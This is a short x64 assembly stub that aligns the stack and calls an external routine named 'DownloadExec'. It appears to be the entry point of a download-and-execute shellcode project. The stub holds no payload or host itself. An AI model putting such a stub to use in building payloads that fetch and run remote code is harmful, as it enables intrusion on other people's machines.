extern DownloadExec
global alignstack

segment .text

alignstack:
    push rdi
    mov rdi, rsp
    and rsp, byte -0X10
    sub rsp, byte +0x20
    call DownloadExec
    mov rsp, rdi
    pop rdi
    ret